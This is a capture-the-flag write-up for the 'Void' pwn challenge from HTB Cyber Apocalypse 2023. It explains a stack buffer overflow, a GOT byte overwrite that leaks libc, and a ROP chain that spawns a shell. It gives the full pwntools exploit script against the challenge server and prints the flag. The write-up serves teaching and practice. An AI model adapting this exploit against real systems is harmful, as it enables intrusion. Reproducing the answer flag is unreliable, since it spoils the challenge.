# Void - HTB Cyber Apocalypse 2023

## Description
```
The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
```

## Solution
The binary is tiny, and only calls read to take our user input. This has a buffer overflow in it.

Checksec
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./glibc/'
```

This is obviously a ret2dlresolve challenge.

However I don't like ret2dlresolve as I don't know how to do it. And to be honest I feel like the technique is not even useful at all. So far I've solved 12/12 challenges which had the intended solution of using ret2dlresolve, without using ret2dlresolve. I'm not about to start learning the technique now!

Since the binary uses read, I took a look at the LSB of read in the GOT, to see if I could overwrite it to become syscall. The answer to that question is yes.

The general flow of exploitation with ROP is then:

1. Call read to overwrite the LSB of the read GOT. So it becomes syscall instead
2. Since overwriting LSB is a one byte read. RAX contains 1. We can now call the Read GOT and instead leak the full GOT
3. Restore the read GOT by jumping to read plt+6. This will re-resolve read and restore its GOT
4. Receive leak and pop shell

Exploit:

```py
from pwn import *

context.binary = "./void"
padding = b'A'*72

io = remote("165.232.108.240",30338)

poprsir15 = p64(0x00000000004011b9)
read = p64(0x00401030)
vuln = p64(0x00401122)
ret = p64(0x0000000000401016)
re_resolve_read = p64(0x00401036)
poprdi = p64(0x00000000004011bb)



payload = [
    #Overwrite LSB so read becomes syscall
    padding,
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    read,
    #Leak the GOT. RAX is already 1
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    poprdi,
    p64(0x1),
    read,
    #Resolve read back to being read again
    poprdi,
    p64(0x0),
    re_resolve_read,
    vuln
]
payload = b''.join(payload)
sleep(0.1)
io.send(payload)
sleep(0.1)
io.send(b'\x8c')
sleep(0.1)
io.send(b'\x80')

#Receive leak
leak = u64(io.recv(8))
libc_base = leak-0xec78c
print(f"LIBC BASE {libc_base:#x}")


#Spawn shell
poprsi = p64(libc_base+0x000000000002590f)
poprdx = p64(libc_base+0x00000000000c8acd)
poprax = p64(libc_base+0x000000000003be88)
syscall = p64(libc_base+0x00000000000550da)
binsh = p64(libc_base+0x00196152)


payload = [
    padding,
    poprdi,
    binsh,
    poprsi,
    p64(0),
    poprdx,
    p64(0),
    poprax,
    p64(59),
    syscall
]

payload = b''.join(payload)
sleep(0.1)
io.send(payload)


io.interactive()
```

## Flag
As expected. The intended solution was ret2dlresolve, and now I'm 13/13 :D

`HTB{r3s0lv3_th3_d4rkn355}`
